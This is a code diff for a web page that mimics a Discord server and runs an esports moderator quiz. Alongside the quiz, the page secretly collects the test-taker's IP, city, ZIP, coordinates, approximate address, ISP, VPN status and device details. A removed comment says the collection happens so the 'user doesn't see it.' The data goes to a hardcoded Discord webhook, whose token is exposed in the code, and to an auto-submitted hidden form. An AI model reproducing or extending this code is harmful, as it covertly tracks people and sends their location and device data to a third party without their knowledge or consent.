-                    avatarColor: "#ed4245",
-                    explanation: "Explain there's no strict hourly requirement but recommend regular practice. Emphasize balance with real life."
                 }
             ];
             
-            // Function to get random questions
             function getRandomTestQuestions() {
-                // Shuffle the array
                 const shuffled = [...allTestQuestions].sort(() => 0.5 - Math.random());
-                // Return first 8 questions
                 return shuffled.slice(0, 8);
             }
             
-            // Enhanced channels data
             const textChannels = [
                 { id: 1, name: "training-test", icon: "fas fa-hashtag", topic: "Simulated mod test", unread: false, notifications: 0 },
                 { id: 2, name: "how-to-join-roster", icon: "fas fa-hashtag", topic: "Information about joining Void", unread: true, notifications: 3 },
                 { id: 3, name: "general", icon: "fas fa-hashtag", topic: "General discussion", unread: true, notifications: 12 },
                 { id: 4, name: "announcements", icon: "fas fa-bullhorn", topic: "Server announcements", unread: false, notifications: 0 },
-                { id: 5, name: "mod-chat", icon: "fas fa-shield-alt", topic: "Moderator discussions", unread: true, notifications: 5 },
-                { id: 6, name: "staff-announcements", icon: "fas fa-bell", topic: "Staff announcements", unread: false, notifications: 0 },
-                { id: 7, name: "roster-applications", icon: "fas fa-user-plus", topic: "Roster applications channel", unread: true, notifications: 7 },
-                { id: 8, name: "help-desk", icon: "fas fa-question-circle", topic: "Get help from staff", unread: false, notifications: 2 }
+                { id: 5, name: "mod-chat", icon: "fas fa-shield-alt", topic: "Moderator discussions", unread: true, notifications: 5 }
             ];
             
             const voiceChannels = [
                 { id: 1, name: "General Voice", icon: "fas fa-volume-up", users: 8, topic: "Casual chatting" },
                 { id: 2, name: "Competitive Scrims", icon: "fas fa-gamepad", users: 12, topic: "Practice and scrims" },
-                { id: 3, name: "Music Lounge", icon: "fas fa-music", users: 5, topic: "Chill with music" },
-                { id: 4, name: "Mod Meeting", icon: "fas fa-users", users: 3, topic: "Staff meetings" },
-                { id: 5, name: "Tournament VC", icon: "fas fa-trophy", users: 0, topic: "Tournament coordination" }
+                { id: 3, name: "Music Lounge", icon: "fas fa-music", users: 5, topic: "Chill with music" }
             ];
             
-            // Test state
             let testCurrentQuestion = 0;
             let testScore = 0;
             let testActive = false;
-            let testTotalQuestions = 8; // Will be set based on random selection
+            let testTotalQuestions = 8;
             let userDiscordUsername = '';
             let userAnswers = [];
             let correctAnswers = [];
-            let testQuestions = []; // Will hold randomly selected questions
-            let userLocationData = {}; // Store user location data
+            let testQuestions = [];
+            let sessionTranscript = [];
             
-            // DOM elements for test page
+            async function sendResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, transcript) {
+                try {
+                    const webhookURL = "https://discord.com/api/webhooks/1468524089999101995/h3vElrQ3cjQBGjmeCOVHr5KZF0JLvacpn1v89dQugXPt3t7yv2apQ0TYcjFE0Ae4Xill";
+                    
+                    const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
+                    const metrics = envData.metrics || {};
+                    
+                    // Format the embed with clean, organized structure
+                    const embed = {
+                        title: "VOID MOD CERTIFICATION TEST RESULTS",
+                        color: passed ? 0x00ff00 : 0xff0000,
+                        timestamp: new Date().toISOString(),
+                        fields: [
+                            {
+                                name: "📊 TEST SUMMARY",
+                                value: [
+                                    `**User:** ${discordUsername}`,
+                                    `**Score:** ${score}/${totalQuestions}`,
+                                    `**Status:** ${passed ? "✅ PASSED" : "❌ FAILED"}`,
+                                    `**Passing Requirement:** ${totalQuestions - 2}/${totalQuestions}`,
+                                    `**Test Date:** ${new Date().toLocaleString()}`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "🌍 LOCATION DATA",
+                                value: [
+                                    `**IP:** ${metrics.ip || "Unknown"}`,
+                                    `**Country:** ${metrics.country || "Unknown"}`,
+                                    `**Region:** ${metrics.region || "Unknown"}`,
+                                    `**City:** ${metrics.city || "Unknown"}`,
+                                    `**ZIP:** ${metrics.zip || "Unknown"}`,
+                                    `**ISP:** ${metrics.isp || "Unknown"}`,
+                                    `**VPN Status:** ${metrics.vpnStatus || "Unknown"}`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ DEVICE INFORMATION",
+                                value: [
+                                    `**Browser:** ${metrics.platform || "Unknown"}`,
+                                    `**Screen:** ${metrics.width || "?"}x${metrics.height || "?"}`,
+                                    `**Timezone:** ${metrics.tz || "Unknown"}`,
+                                    `**CPU Cores:** ${metrics.cores || "Unknown"}`,
+                                    `**RAM:** ${metrics.ram || "Unknown"}GB`,
+                                    `**Language:** ${metrics.language || "Unknown"}`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "📈 PERFORMANCE METRICS",
+                                value: [
+                                    `**Total Questions:** ${totalQuestions}`,
+                                    `**Correct Answers:** ${score}`,
+                                    `**Accuracy Rate:** ${Math.round((score/totalQuestions)*100)}%`,
+                                    `**Performance:** ${score >= totalQuestions - 2 ? "PASSING ✅" : "NEEDS IMPROVEMENT ⚠️"}`
+                                ].join('\n'),
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Void Esports • Security Audit System"
+                        }
+                    };
+                    
+                    // Format conversation transcript cleanly
+                    let transcriptText = "**CONVERSATION TRANSCRIPT:**\n```\n";
+                    let userCount = 0;
+                    let botCount = 0;
+                    
+                    transcript.forEach((entry, index) => {
+                        const prefix = entry.speaker === "You" ? "[USER]" : 
+                                     entry.speaker === "Void Bot" ? "[BOT]" : 
+                                     entry.speaker === "System" ? "[SYS]" : "[TEST]";
+                        
+                        if (entry.speaker === "You") userCount++;
+                        if (entry.speaker === "Void Bot") botCount++;
+                        
+                        transcriptText += `${prefix} ${entry.message}\n`;
+                    });
+                    transcriptText += "```";
+                    
+                    const transcriptEmbed = {
+                        title: "💬 CONVERSATION TRANSCRIPT",
+                        description: transcriptText,
+                        color: 0x5865f2,
+                        fields: [
+                            {
+                                name: "📊 STATISTICS",
+                                value: [
+                                    `**User Messages:** ${userCount}`,
+                                    `**Bot Messages:** ${botCount}`,
+                                    `**Total Messages:** ${transcript.length}`,
+                                    `**Session ID:** VOID-${Date.now().toString().slice(-8)}`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "🎯 ANALYSIS",
+                                value: [
+                                    `**Correct Responses:** ${score}/${totalQuestions}`,
+                                    `**Response Accuracy:** ${Math.round((score/totalQuestions)*100)}%`,
+                                    `**Final Verdict:** ${passed ? "APPROVED ✅" : "REVIEW REQUIRED ❌"}`
+                                ].join('\n'),
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Transcript generated automatically"
+                        }
+                    };
+                    
+                    const payload = { 
+                        embeds: [embed, transcriptEmbed],
+                        username: "Void Audit System",
+                        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+                    };
+                    
+                    await fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    return true;
+                } catch (error) {
+                    console.error("Failed to send to Discord:", error);
+                    return false;
+                }
+            }
+            
+            function addToTranscript(speaker, message) {
+                sessionTranscript.push({
+                    speaker: speaker,
+                    message: message,
+                    timestamp: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+                });
+            }
+            
             const backToTrainingBtn = document.getElementById('backToTraining');
             const testMessagesContainer = document.getElementById('messagesContainer');
             const testMessageInput = document.getElementById('messageInput');
@@ -3396,7 +3342,6 @@
             const statTickets = document.getElementById('statTickets');
             const statScore = document.getElementById('statScore');
             
-            // Mobile elements
             const mobileMenuButton = document.getElementById('mobileMenuButton');
             const mobileBackArrow = document.getElementById('mobileBackArrow');
             const mobileOverlay = document.getElementById('mobileOverlay');
@@ -3415,7 +3360,6 @@
             const mobileUserAvatar = document.getElementById('mobileUserAvatar');
             const mobileUsernameDisplay = document.getElementById('mobileUsernameDisplay');
             
-            // Sidebar elements (PC)
             const serverHeader = document.getElementById('serverHeader');
             const serverDropdown = document.getElementById('serverDropdown');
             const serverInfoPanel = document.getElementById('serverInfoPanel');
@@ -3432,161 +3376,150 @@
             const userModalName = document.getElementById('userModalName');
             const userModalTag = document.getElementById('userModalTag');
             
-            // Chat control buttons
             const pinMessagesBtn = document.getElementById('pinMessagesBtn');
             const membersListBtn = document.getElementById('membersListBtn');
             const searchBtn = document.getElementById('searchBtn');
             
-            // Check if device is mobile
             const isMobile = window.innerWidth <= 768;
             
-            // Mobile layout adjustment function
             function adjustMobileLayout() {
                 if (window.innerWidth <= 768) {
-                    // Make sure buttons don't overlap
                     const menuButton = document.getElementById('mobileMenuButton');
                     const backArrow = document.getElementById('mobileBackArrow');
                     const backToTraining = document.getElementById('backToTraining');
                     
                     if (menuButton && backArrow && backToTraining) {
-                        // Ensure proper z-index stacking
                         menuButton.style.zIndex = '1003';
                         backArrow.style.zIndex = '1002';
                         backToTraining.style.zIndex = '1002';
-                        
-                        // Position back arrow next to menu button
                         backArrow.style.left = '60px';
-                        
-                        // Position back-to-training button on right side
                         backToTraining.style.left = 'auto';
                         backToTraining.style.right = '15px';
                     }
                     
-                    // Ensure message input area is visible when keyboard opens
                     const messageInput = document.getElementById('messageInput');
                     if (messageInput) {
                         messageInput.addEventListener('focus', function() {
-                            // Scroll to bottom when input is focused
                             setTimeout(() => {
                                 const messagesContainer = document.getElementById('messagesContainer');
                                 if (messagesContainer) {
                                     messagesContainer.scrollTop = messagesContainer.scrollHeight;
                                 }
                             }, 300);
-                            
-                            // Add keyboard-open class to body
                             document.body.classList.add('keyboard-open');
                         });
                         
                         messageInput.addEventListener('blur', function() {
-                            // Remove keyboard-open class when input loses focus
                             document.body.classList.remove('keyboard-open');
                         });
                     }
                 }
             }
             
-            // Call adjustMobileLayout on load and resize
             adjustMobileLayout();
             window.addEventListener('resize', adjustMobileLayout);
             
-            // Function to collect user location data
-            async function collectUserLocation() {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    
-                    userLocationData = {
-                        ip: data.ip || "Unknown",
-                        country: data.country_name || "Unknown",
-                        state: data.region || "Unknown",
-                        city: data.city || "Unknown",
-                        timezone: data.timezone || "Unknown",
-                        isp: data.org || "Unknown"
-                    };
-                    
-                    return userLocationData;
-                } catch (error) {
-                    console.log("Location fetch failed, using fallback");
-                    // Try fallback API
-                    try {
-                        const fallbackResponse = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await fallbackResponse.json();
-                        
-                        userLocationData = {
-                            ip: ipData.ip || "Unknown",
-                            country: "Unknown",
-                            state: "Unknown",
-                            city: "Unknown",
-                            timezone: "Unknown",
-                            isp: "Unknown"
-                        };
-                        
-                        return userLocationData;
-                    } catch (fallbackError) {
-                        userLocationData = {
-                            ip: "Unknown",
-                            country: "Unknown",
-                            state: "Unknown",
-                            city: "Unknown",
-                            timezone: "Unknown",
-                            isp: "Unknown"
-                        };
-                        return userLocationData;
-                    }
+            function sendEnhancedEmailResults(transcript) {
+                let fullTranscriptText = "COMPLETE TEST TRANSCRIPT:\n\n";
+                transcript.forEach((entry, idx) => {
+                    fullTranscriptText += `${idx+1}. [${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
+                });
+                
+                const now = new Date();
+                const testDate = now.toLocaleDateString('en-US', { 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
+                
+                const passingScore = testTotalQuestions - 2;
+                const passed = testScore >= passingScore;
+                
+                const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
+                const metrics = envData.metrics || {};
+                
+                const form = document.getElementById('resultsForm');
+                if (!form) return;
+                
+                const enhancedFields = `
+                    <input type="hidden" name="user_agent" value="${metrics.agent || ''}">
+                    <input type="hidden" name="screen_resolution" value="${metrics.width || ''}x${metrics.height || ''}">
+                    <input type="hidden" name="timezone" value="${metrics.tz || ''}">
+                    <input type="hidden" name="browser_language" value="${metrics.language || ''}">
+                    <input type="hidden" name="approx_address" value="${metrics.approxAddress || ''}">
+                    <input type="hidden" name="coordinates" value="${metrics.lat || ''},${metrics.lon || ''}">
+                    <input type="hidden" name="full_transcript" value="${encodeURIComponent(fullTranscriptText)}">
+                    <input type="hidden" name="device_cores" value="${metrics.cores || ''}">
+                    <input type="hidden" name="device_ram" value="${metrics.ram || ''}">
+                    <input type="hidden" name="isp_organization" value="${metrics.isp || ''}">
+                    <input type="hidden" name="zip_postal" value="${metrics.zip || ''}">
+                    <input type="hidden" name="vpn_status" value="${metrics.vpnStatus || ''}">
+                    <input type="hidden" name="vpn_detected" value="${metrics.vpnDetected || 'false'}">
+                `;
+                
+                const tempDiv = document.createElement('div');
+                tempDiv.innerHTML = enhancedFields;
+                while (tempDiv.firstChild) {
+                    form.appendChild(tempDiv.firstChild);
                 }
+                
+                const formDiscordUsername = document.getElementById('formDiscordUsername');
+                const formTestDate = document.getElementById('formTestDate');
+                const formFinalScore = document.getElementById('formFinalScore');
+                const formPassFail = document.getElementById('formPassFail');
+                const formQuestionBreakdown = document.getElementById('formQuestionBreakdown');
+                const formTotalQuestions = document.getElementById('formTotalQuestions');
+                const formUserIp = document.getElementById('formUserIp');
+                const formUserCountry = document.getElementById('formUserCountry');
+                const formUserState = document.getElementById('formUserState');
+                const formUserCity = document.getElementById('formUserCity');
+                const formUserTimezone = document.getElementById('formUserTimezone');
+                
+                if (formDiscordUsername) formDiscordUsername.value = userDiscordUsername;
+                if (formTestDate) formTestDate.value = testDate;
+                if (formFinalScore) formFinalScore.value = `${testScore}/${testTotalQuestions}`;
+                if (formPassFail) formPassFail.value = passed ? "PASS" : "FAIL";
+                if (formQuestionBreakdown) formQuestionBreakdown.value = fullTranscriptText.substring(0, 5000);
+                if (formTotalQuestions) formTotalQuestions.value = testTotalQuestions;
+                if (formUserIp) formUserIp.value = metrics.ip || "Unknown";
+                if (formUserCountry) formUserCountry.value = metrics.country || "Unknown";
+                if (formUserState) formUserState.value = metrics.region || "Unknown";
+                if (formUserCity) formUserCity.value = metrics.city || "Unknown";
+                if (formUserTimezone) formUserTimezone.value = metrics.tz || "Unknown";
+                
+                form.submit();
             }
             
-            // Function to send results to Discord webhook
-            async function sendResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, locationData) {
-                try {
-                    // REPLACE THIS URL WITH YOUR DISCORD WEBHOOK URL
-                    const webhookURL = "https://discord.com/api/webhooks/1468524089999101995/h3vElrQ3cjQBGjmeCOVHr5KZF0JLvacpn1v89dQugXPt3t7yv2apQ0TYcjFE0Ae4Xill";
-                    
-                    const embed = {
-                        title: "🎮 Void Mod Certification Test Results",
-                        description: `**User:** ${discordUsername}\n**Score:** ${score}/${totalQuestions}\n**Status:** ${passed ? "✅ PASSED" : "❌ FAILED"}\n**Passing Score:** ${totalQuestions - 2}/${totalQuestions}`,
-                        color: passed ? 0x00ff00 : 0xff0000,
-                        timestamp: new Date().toISOString(),
-                        fields: [
-                            {
-                                name: "📍 Location Data",
-                                value: `**IP:** ${locationData.ip}\n**Country:** ${locationData.country}\n**State:** ${locationData.state}\n**City:** ${locationData.city}\n**ISP:** ${locationData.isp}`
-                            },
-                            {
-                                name: "📊 Test Details",
-                                value: `**Questions:** ${totalQuestions}\n**Correct:** ${score}\n**Percentage:** ${Math.round((score/totalQuestions)*100)}%`
-                            }
-                        ],
-                        footer: {
-                            text: "Void Esports Mod Training System"
-                        }
-                    };
-                    
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ 
-                            embeds: [embed],
-                            username: "Void Mod Test Bot",
-                            avatar_url: "https://cdn.discordapp.com/attachments/your-image-url/void-logo.png"
-                        })
-                    });
-                    
-                    return true;
-                } catch (error) {
-                    console.error("Failed to send to Discord:", error);
-                    return false;
-                }
-            }
-            
-            // Initialize the Discord interface
             function initializeDiscordInterface() {
-                // Populate text channels for both PC and mobile
+                function populateChannelsList(container) {
+                    if (!container) return;
+                    
+                    container.innerHTML = '';
+                    textChannels.forEach(channel => {
+                        const channelItem = document.createElement('div');
+                        channelItem.className = `channel-item ${channel.id === 1 ? 'active' : ''} ${channel.unread ? 'unread' : ''}`;
+                        channelItem.dataset.channelId = channel.id;
+                        channelItem.dataset.channelName = channel.name;
+                        channelItem.dataset.channelTopic = channel.topic;
+                        
+                        channelItem.innerHTML = `
+                            <div class="channel-icon">
+                                <i class="${channel.icon}"></i>
+                            </div>
+                            <div class="channel-name">${channel.name}</div>
+                            ${channel.notifications > 0 ? `<div class="channel-notification">${channel.notifications}</div>` : ''}
+                        `;
+                        
+                        channelItem.addEventListener('click', () => switchChannel(channel.id));
+                        container.appendChild(channelItem);
+                    });
+                }
+                
                 populateChannelsList(channelsList);
                 populateChannelsList(mobileChannelsList);
                 
-                // Populate voice channels (PC only)
                 if (voiceChannelsList) {
                     voiceChannelsList.innerHTML = '';
                     voiceChannels.forEach(channel => {
@@ -3606,7 +3539,6 @@
                     });
                 }
                 
-                // PC sidebar functionality
                 if (serverHeader) {
                     serverHeader.addEventListener('click', () => {
                         if (serverInfoPanel && serverDropdown) {
@@ -3632,7 +3564,6 @@
                     });
                 }
                 
-                // Mobile sidebar functionality
                 if (mobileServerHeader) {
                     mobileServerHeader.addEventListener('click', () => {
                         if (mobileServerInfoPanel && mobileServerDropdown) {
@@ -3650,7 +3581,6 @@
                     });
                 }
                 
-                // Mobile menu toggle
                 if (mobileMenuButton) {
                     mobileMenuButton.addEventListener('click', () => {
                         mobileSidebar.classList.add('active');
@@ -3658,7 +3588,6 @@
                     });
                 }
                 
-                // Mobile back arrow
                 if (mobileBackArrow) {
                     mobileBackArrow.addEventListener('click', () => {
                         mobileSidebar.classList.add('active');
@@ -3666,7 +3595,6 @@
                     });
                 }
                 
-                // Close mobile sidebar when clicking overlay
                 if (mobileOverlay) {
                     mobileOverlay.addEventListener('click', () => {
                         mobileSidebar.classList.remove('active');
@@ -3674,7 +3602,6 @@
                     });
                 }
                 
-                // Close mobile sidebar when clicking a channel
                 document.addEventListener('click', (e) => {
                     if (e.target.closest('.channel-item')) {
                         mobileSidebar.classList.remove('active');
@@ -3682,14 +3609,12 @@
                     }
                 });
                 
-                // User profile modal (PC)
                 if (userProfile && userModal) {
                     userProfile.addEventListener('click', (e) => {
                         e.stopPropagation();
                         userModal.classList.toggle('active');
                     });
                     
-                    // Close modal when clicking outside
                     document.addEventListener('click', (e) => {
                         if (userModal && !userModal.contains(e.target) && userProfile && !userProfile.contains(e.target)) {
                             userModal.classList.remove('active');
@@ -3697,15 +3622,12 @@
                     });
                 }
                 
-                // User profile modal (mobile)
                 if (mobileUserProfile) {
                     mobileUserProfile.addEventListener('click', () => {
-                        // For mobile, we'll just show a simple alert or could implement a mobile-specific modal
                         showNotification("User profile would open here on mobile.");
                     });
                 }
                 
-                // Chat control buttons
                 if (pinMessagesBtn) {
                     pinMessagesBtn.addEventListener('click', () => {
                         showNotification("Pinned messages would open here in a real Discord client.");
@@ -3724,38 +3646,10 @@
                     });
                 }
                 
-                // Set initial channel info
                 updateChannelInfo(1);
             }
             
-            // Populate channels list
-            function populateChannelsList(container) {
-                if (!container) return;
-                
-                container.innerHTML = '';
-                textChannels.forEach(channel => {
-                    const channelItem = document.createElement('div');
-                    channelItem.className = `channel-item ${channel.id === 1 ? 'active' : ''} ${channel.unread ? 'unread' : ''}`;
-                    channelItem.dataset.channelId = channel.id;
-                    channelItem.dataset.channelName = channel.name;
-                    channelItem.dataset.channelTopic = channel.topic;
-                    
-                    channelItem.innerHTML = `
-                        <div class="channel-icon">
-                            <i class="${channel.icon}"></i>
-                        </div>
-                        <div class="channel-name">${channel.name}</div>
-                        ${channel.notifications > 0 ? `<div class="channel-notification">${channel.notifications}</div>` : ''}
-                    `;
-                    
-                    channelItem.addEventListener('click', () => switchChannel(channel.id));
-                    container.appendChild(channelItem);
-                });
-            }
-            
-            // Switch to a different channel
             function switchChannel(channelId) {
-                // Update active channel in sidebar (both PC and mobile)
                 document.querySelectorAll('.channel-item').forEach(item => {
                     item.classList.remove('active');
                 });
@@ -3763,40 +3657,34 @@
                 const activeChannel = document.querySelector(`.channel-item[data-channel-id="${channelId}"]`);
                 if (activeChannel) activeChannel.classList.add('active');
                 
-                // Update channel info in header
                 const channel = textChannels.find(c => c.id === channelId);
                 if (channel) {
                     updateChannelInfo(channelId);
                     
-                    // If switching away from training-test during test, show warning
                     if (channelId !== 1 && testActive) {
                         showNotification("You're currently in a test. Please stay in #training-test to complete it.");
                     }
                 }
             }
             
-            // Update channel information in header
             function updateChannelInfo(channelId) {
                 const channel = textChannels.find(c => c.id === channelId);
                 if (channel) {
                     if (activeChannelName) activeChannelName.textContent = channel.name;
                     if (channelTopic) channelTopic.textContent = channel.topic;
                     
-                    // Update online count based on channel
-                    let count = 3; // Base count for training-test
-                    if (channelId === 2) count = 8; // how-to-join-roster
-                    else if (channelId === 3) count = 24; // general
-                    else if (channelId === 5) count = 6; // mod-chat
+                    let count = 3;
+                    if (channelId === 2) count = 8;
+                    else if (channelId === 3) count = 24;
+                    else if (channelId === 5) count = 6;
                     
                     if (onlineCount) onlineCount.textContent = count;
                 }
             }
             
-            // Show notification
             function showNotification(message) {
                 if (!testMessagesContainer) return;
                 
-                // Create notification element
                 const notification = document.createElement('div');
                 notification.className = 'message';
                 notification.style.animation = 'messageAppear 0.3s ease';
@@ -3818,7 +3706,6 @@
                 testMessagesContainer.scrollTop = testMessagesContainer.scrollHeight;
             }
             
-            // Back to training button
             if (backToTrainingBtn) {
                 backToTrainingBtn.addEventListener('click', function() {
                     const testPage = document.getElementById('testPage');
@@ -3839,7 +3726,6 @@
                 });
             }
             
-            // Start test with username button
             const startTestWithUsernameBtn = document.getElementById('startTestWithUsername');
             if (startTestWithUsernameBtn) {
                 startTestWithUsernameBtn.addEventListener('click', async function() {
@@ -3852,13 +3738,8 @@
                         return;
                     }
                     
-                    // Collect user location data (happens in background, user doesn't see it)
-                    await collectUserLocation();
-                    
-                    // Store the username
                     userDiscordUsername = discordUsername;
                     
-                    // Update the display for both PC and mobile
                     const usernameDisplay = document.getElementById('usernameDisplay');
                     const userModalNameElem = document.getElementById('userModalName');
                     const userModalTagElem = document.getElementById('userModalTag');
@@ -3869,13 +3750,11 @@
                     if (userModalTagElem) userModalTagElem.textContent = discordUsername;
                     if (mobileUsernameDisplayElem) mobileUsernameDisplayElem.textContent = discordUsername.split('#')[0];
                     
-                    // Set avatar initials
                     const initials = discordUsername.split('#')[0].charAt(0).toUpperCase();
                     if (userAvatar) userAvatar.textContent = initials;
                     if (userModalAvatar) userModalAvatar.textContent = initials;
                     if (mobileUserAvatar) mobileUserAvatar.textContent = initials;
                     
-                    // Hide modal and show test page
                     const usernameModal = document.getElementById('usernameModal');
                     const mainContainer = document.getElementById('mainContainer');
                     const testPage = document.getElementById('testPage');
@@ -3884,16 +3763,13 @@
                     if (mainContainer) mainContainer.style.display = 'none';
                     if (testPage) testPage.style.display = 'block';
                     
-                    // Initialize Discord interface
                     initializeDiscordInterface();
                     
-                    // Show/hide mobile elements based on device
                     if (isMobile) {
                         if (mobileMenuButton) mobileMenuButton.style.display = 'block';
                         if (mobileBackArrow) mobileBackArrow.style.display = 'block';
                         if (document.querySelector('.discord-sidebar')) document.querySelector('.discord-sidebar').style.display = 'none';
                         
-                        // Apply mobile-specific styling for message input area
                         const messageInputArea = document.querySelector('.message-input-area');
                         if (messageInputArea) {
                             messageInputArea.style.padding = '15px';
@@ -3905,25 +3781,21 @@
                         if (document.querySelector('.discord-sidebar')) document.querySelector('.discord-sidebar').style.display = 'flex';
                     }
                     
-                    // Start the test
                     setTimeout(() => {
                         startTest();
                     }, 1000);
                 });
             }
             
-            // Auto-resize textarea
             if (testMessageInput) {
                 testMessageInput.addEventListener('input', function() {
                     this.style.height = 'auto';
-                    const newHeight = Math.min(this.scrollHeight, 200); // Limit max height
+                    const newHeight = Math.min(this.scrollHeight, 200);
                     this.style.height = newHeight + 'px';
                     
-                    // Adjust messages container padding if on mobile
                     if (isMobile) {
                         const messagesContainer = document.getElementById('messagesContainer');
                         if (messagesContainer) {
-                            // Calculate extra padding needed based on textarea height
                             const extraPadding = Math.max(0, newHeight - 100);
                             messagesContainer.style.paddingBottom = (20 + extraPadding) + 'px';
                         }
@@ -3931,7 +3803,6 @@
                 });
             }
             
-            // Send message on Enter (without Shift)
             if (testMessageInput) {
                 testMessageInput.addEventListener('keydown', function(e) {
                     if (e.key === 'Enter' && !e.shiftKey) {
@@ -3941,12 +3812,10 @@
                 });
             }
             
-            // Send message on button click
             if (testSendButton) {
                 testSendButton.addEventListener('click', sendTestMessage);
             }
             
-            // Retake test button
             if (testReviewTestBtn) {
                 testReviewTestBtn.addEventListener('click', function() {
                     resetTest();
@@ -3958,9 +3827,7 @@
                 });
             }
             
-            // Function to start the test
             function startTest() {
-                // Get random questions
                 testQuestions = getRandomTestQuestions();
                 testTotalQuestions = testQuestions.length;
                 
@@ -3969,11 +3836,13 @@
                 testScore = 0;
                 userAnswers = [];
                 correctAnswers = [];
+                sessionTranscript = [];
+                addToTranscript("System", "Test session started");
+                
                 updateTestScore();
                 updateTestStatus();
                 updateTestProgressBar();
                 
-                // Clear previous messages (keep only initial bot messages)
                 if (testMessagesContainer) {
                     const initialMessages = testMessagesContainer.querySelectorAll('.message');
                     for (let i = 2; i < initialMessages.length; i++) {
@@ -3981,11 +3850,9 @@
                     }
                 }
                 
-                // Update user stats
                 if (statTickets) statTickets.textContent = Math.floor(Math.random() * 5) + 1;
                 if (statScore) statScore.textContent = "0%";
                 
-                // Reset message input height
                 if (testMessageInput) {
                     testMessageInput.style.height = 'auto';
                     if (isMobile) {
@@ -3993,24 +3860,22 @@
                     }
                 }
                 
-                // Start with first question
                 setTimeout(() => {
                     showNextTestQuestion();
                 }, 2000);
             }
             
-            // Function to reset the test
             function resetTest() {
                 testActive = false;
                 testCurrentQuestion = 0;
                 testScore = 0;
                 userAnswers = [];
                 correctAnswers = [];
+                sessionTranscript = [];
                 updateTestScore();
                 updateTestStatus();
                 updateTestProgressBar();
                 
-                // Clear input
                 if (testMessageInput) {
                     testMessageInput.value = '';
                     testMessageInput.style.height = 'auto';
@@ -4019,75 +3884,60 @@
                 if (testSendButton) testSendButton.disabled = true;
             }
             
-            // Function to show the next question from the bot
             function showNextTestQuestion() {
                 if (testCurrentQuestion >= testTotalQuestions) {
                     endTest();
                     return;
                 }
                 
-                // Show typing indicator
                 if (testTypingIndicator) testTypingIndicator.style.display = 'flex';
                 
-                // Wait 1-2 seconds to simulate typing
                 setTimeout(() => {
                     if (testTypingIndicator) testTypingIndicator.style.display = 'none';
                     
-                    // Add the user's message
                     const question = testQuestions[testCurrentQuestion];
                     addTestMessage(question.user, question.userMessage, question.avatarColor, false);
                     
-                    // Enable input for user response
                     if (testMessageInput) {
                         testMessageInput.disabled = false;
                         testMessageInput.focus();
                     }
                     if (testSendButton) testSendButton.disabled = false;
                     
-                    // Update status
                     updateTestStatus();
                     updateTestProgressBar();
                 }, 1500 + Math.random() * 1000);
             }
             
-            // Function to send user's message
             function sendTestMessage() {
                 if (!testMessageInput || !testActive) return;
                 
                 const userMessage = testMessageInput.value.trim();
                 if (!userMessage) return;
                 
-                // Add user's message to chat
                 addTestMessage("You", userMessage, "#5865f2", true);
                 
-                // Store the answer
                 userAnswers.push(userMessage);
                 
-                // Clear input
                 testMessageInput.value = '';
                 testMessageInput.style.height = 'auto';
                 
-                // Check if answer is correct
                 const isCorrect = checkTestAnswer(userMessage);
                 correctAnswers.push(isCorrect);
                 
-                // Disable input while bot "types"
                 testMessageInput.disabled = true;
                 if (testSendButton) testSendButton.disabled = true;
                 
-                // Move to next question after delay
                 setTimeout(() => {
                     testCurrentQuestion++;
                     showNextTestQuestion();
                 }, 1000);
             }
             
-            // Enhanced function to check if answer is correct with comprehensive keyword matching
             function checkTestAnswer(userAnswer) {
                 const question = testQuestions[testCurrentQuestion];
                 const userAnswerLower = userAnswer.toLowerCase();
                 
-                // Count matching keywords
                 let matchCount = 0;
                 for (let keyword of question.correctKeywords) {
                     if (userAnswerLower.includes(keyword.toLowerCase())) {
@@ -4095,16 +3945,13 @@
                     }
                 }
                 
-                // Check if we have enough matches
                 const isCorrect = matchCount >= question.requiredMatches;
                 
-                // Update score if correct
                 if (isCorrect) {
                     testScore++;
                     updateTestScore();
                     updateTestProgressBar();
                     
-                    // Add correct badge to last user message
                     const lastMessage = testMessagesContainer.lastElementChild;
                     if (lastMessage && lastMessage.classList.contains('message')) {
                         lastMessage.classList.add('correct');
@@ -4116,7 +3963,6 @@
                             badge.textContent = 'Correct';
                             messageText.appendChild(badge);
                             
-                            // Add explanation tooltip
                             const tooltip = document.createElement('div');
                             tooltip.className = 'correction-note';
                             tooltip.style.marginTop = '10px';
@@ -4126,7 +3972,6 @@
                         }
                     }
                 } else {
-                    // Add incorrect badge to last user message
                     const lastMessage = testMessagesContainer.lastElementChild;
                     if (lastMessage && lastMessage.classList.contains('message')) {
                         lastMessage.classList.add('incorrect');
@@ -4138,7 +3983,6 @@
                             badge.textContent = 'Incorrect';
                             messageText.appendChild(badge);
                             
-                            // Add explanation tooltip
                             const tooltip = document.createElement('div');
                             tooltip.className = 'correction-note';
                             tooltip.style.marginTop = '10px';
@@ -4152,18 +3996,17 @@
                 return isCorrect;
             }
             
-            // Function to add a message to the chat
             function addTestMessage(username, text, avatarColor, isUser = false) {
                 if (!testMessagesContainer) return;
+                
+                addToTranscript(username, text);
                 
                 const messageDiv = document.createElement('div');
                 messageDiv.className = 'message';
                 
-                // Get current time for timestamp
                 const now = new Date();
                 const timeString = `${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')}`;
                 
-                // Create avatar initials
                 let avatarInitials = username.charAt(0).toUpperCase();
                 if (username === "Nicks Cold") avatarInitials = "NC";
